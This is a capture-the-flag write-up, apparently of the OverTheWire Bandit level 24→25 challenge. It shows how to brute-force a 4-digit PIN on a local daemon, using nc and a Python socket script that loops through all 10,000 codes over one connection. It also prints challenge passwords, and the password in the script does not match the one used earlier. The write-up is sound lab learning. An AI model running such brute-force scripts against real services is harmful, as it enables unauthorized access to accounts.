# Bandit Level 24 → Level 25

##  Goal

A daemon is listening on port `30002`. It gives the password for **Bandit Level 25** when given:

1. The password for **Bandit Level 24**
2. A secret **4-digit PIN**

The PIN cannot be retrieved directly, so I need to try all **10,000 possible combinations** from `0000` to `9999`. This is called **brute-forcing**.

The challenge also says that I do not need to create a new connection for every attempt, so I can use a single TCP connection and send all PIN attempts through it.

##  Connecting to the Daemon

First, I connected to the service running on port `30002` using `nc`:

```bash
nc localhost 30002
```

The server displayed:

```text
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```

I tested the password with the PIN `0000`:

```text
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0000
```

The server responded:

```text
Wrong! Please enter the correct current password and pincode. Try again.
```

This confirmed that the password was correct but the PIN `0000` was not.

##  Understanding Brute Force

There are 10,000 possible 4-digit PINs:

```text
0000
0001
0002
0003
...
9999
```

Instead of manually entering every PIN, I created a Python script to automatically try every combination.

##  Creating the Brute-Force Script

I created a Python file:

```bash
nano /tmp/brute.py
```

The script was:

```python
import socket

password = "hVQMk3_Lvl_24_pass_Xv"

s = socket.socket()
s.connect(("localhost", 30002))

welcome = s.recv(1024).decode()
print(welcome)

for pin in range(10000):
    code = f"{pin:04d}"
    message = f"{password} {code}\n"

    s.sendall(message.encode())

    response = s.recv(1024).decode()

    if "Wrong!" not in response:
        print("Correct PIN:", code)
        print(response)
        break

    print(f"Tried {code}")

s.close()
```



The daemon then gave me the password for **Bandit Level 25**:

```text
SoHfqMOEqIX2IYK**************jx4P
```



##  What I Learned

* **Brute force** means systematically trying all possible values until the correct one is found.
* A 4-digit PIN has **10,000 possible combinations**, from `0000` to `9999`.
* Python's `socket` module can communicate with a network service.
* `socket.connect()` creates the TCP connection.
* `sendall()` sends data through the connection.
* `recv()` receives data from the server.
* `f"{pin:04d}"` formats a number as a 4-digit PIN.
* I learned how to automate repeated network requests using Python.
* The challenge specifically taught me that I can maintain **one connection** and send multiple PIN attempts through it instead of reconnecting every time.


